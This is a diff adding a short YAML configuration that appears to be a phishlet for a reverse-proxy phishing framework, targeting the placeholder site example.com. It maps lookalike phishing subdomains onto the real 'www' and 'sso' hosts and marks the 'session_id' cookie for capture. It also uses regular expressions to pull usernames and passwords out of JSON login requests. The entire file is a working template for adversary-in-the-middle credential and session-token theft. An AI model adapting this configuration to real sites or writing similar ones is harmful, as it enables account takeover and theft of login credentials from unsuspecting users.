@@ -1,0 +1,23 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'example', orig_sub: 'www', domain: 'example.com', session: true, is_landing: true}
+  - {phish_sub: 'ssox', orig_sub: 'sso', domain: 'example.com', session: false, is_landing: false}
+auth_tokens:
+  - domain: '.example.com'
+    keys: ['session_id']
+credentials:
+  username:
+    key: 'user'
+    search: '"user":"([^"]*)"'
+    type: json
+  password:
+    key: 'pass'
+    search: '"pass":"([^"]*)"'
+    type: json
+login:
+  domain: 'www.example.com'
+  path: '/login'
+kasada_origins:
+  - triggers_on: 'sso.example.com'
+    orig_sub: 'sso'
+    domain: 'example.com'
